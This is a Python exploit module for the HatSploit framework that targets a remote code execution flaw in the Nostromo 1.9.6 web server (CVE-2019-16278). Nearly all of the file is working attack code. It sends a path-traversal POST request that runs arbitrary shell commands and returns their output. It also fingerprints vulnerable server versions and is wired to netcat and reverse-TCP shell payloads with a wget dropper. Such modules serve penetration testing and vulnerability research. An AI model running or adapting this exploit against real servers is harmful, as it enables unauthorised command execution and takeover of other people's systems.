"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP, TCP


class HatSploitModule(Module, Handler, HTTP, TCP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Nostromo httpd Remote Code Execution",
            'Module': "exploit/linux/nostromo/remote_code_execution",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "sp0re (sp0re) - vulnerability researcher",
            ],
            'Description': (
                "Nostromo 1.9.6 webserver has a vulnerability leading to a "
                "remote code execution."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Payload': {
                PayloadInlineMixin: {
                    'Value': "unix/generic/netcat_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_GENERIC]
                },
                PayloadDropMixin: {
                    'Value': "linux/x64/shell_reverse_tcp",
                    'Platform': [OS_LINUX]
                }
            },
            'References': [
                {'URL': 'http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2019-16278'},
                {'URL': 'https://www.exploit-db.com/exploits/47837'},
                {'CVE': '2019-16278'},
                {'EDB': 47837}
            ],
            'DisclosureDate': "2019-10-14",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

    def __call__(self):
        self.dropper.set('wget')

    def exploit(self, command):
        payload = ""
        payload += "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += f"{command} 2>&1"

        client = self.open_tcp()

        client.connect()
        client.send(payload.encode())

        response = client.recv(4096)
        response = response.decode()

        client.disconnect()
        response = response.split('\r\n\r\n', 1)

        if len(response) == 2:
            return response[1]

    def check(self):
        response = self.http_request(
            method="HEAD",
            path="/"
        )

        if response:
            if 'Server' in response.headers:
                server = response.headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True

        return False

    def run(self):
        self.module_handle(
            sender=self.exploit,
        )
